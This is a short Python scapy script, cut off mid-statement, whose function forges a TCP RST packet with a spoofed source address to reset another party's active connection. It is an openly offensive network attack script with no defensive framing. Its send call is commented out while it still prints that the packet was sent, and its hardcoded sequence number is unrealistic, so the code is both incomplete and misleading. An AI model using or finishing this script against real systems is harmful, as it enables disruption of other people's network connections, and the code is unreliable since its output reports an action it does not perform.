from scapy.all import *
import sys

def send_rst(target_ip, target_port, src_ip , src_port):
    """
    sends a forged TCPRST packet to reset an active connection.
    """
    #create and IP packet to reset the active connection
    ip = IP(src=src_ip, dst=target_ip)
    
    #create a TCP RST packet
    tcp = TCP(sport = src_port, dport=target_port, flags="R" , seq =1000)

    # combine and send the packet
    rst_packet = ip/tcp
    # send(rst_packet , verbose = False)
    print(f"[+] Sent TCP RST packet from {src_ip}:{src_port} to {target_ip}:{target_port}")

if __name__ == "__main__":
    if